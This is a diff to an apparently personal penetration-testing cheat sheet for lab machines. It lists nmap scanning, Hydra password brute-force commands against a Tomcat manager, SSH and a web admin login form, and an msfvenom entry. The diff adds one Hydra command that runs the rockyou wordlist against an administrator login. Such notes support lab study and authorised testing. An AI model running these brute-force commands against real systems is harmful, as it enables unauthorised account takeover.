@@ -4,6 +4,7 @@ Nmap -sC -sV -oA export_path/filename IP Address
 HYDRA_PROXY_HTTP=http://127.0.0.1:8080 hydra -vV -C /usr/share/seclists/Passwords/Default-Credentials/tomcat-betterdefaultpasslist.txt -s 8080 10.10.10.95 http-get  /manager/html
   Proxy is used with Burp Suite; -C is pass list username:password; -vV is Verbose
   hydra -l root -P /usr/share/wordlists/rockyou.txt 192.168.1.105 -t 4 ssh
+  hydra -c 5 -l floris -P /usr/share/wordlists/rockyou.txt 10.10.10.150 http-post-form "/administrator/index.php:username=^USER^&passwd=^PASS^&Login:'Username and password do not match or you do not have an account yet.'"
 
 Msfvenom 
   Msfvenom -l formats (list format such as asp, dll, exe, war)
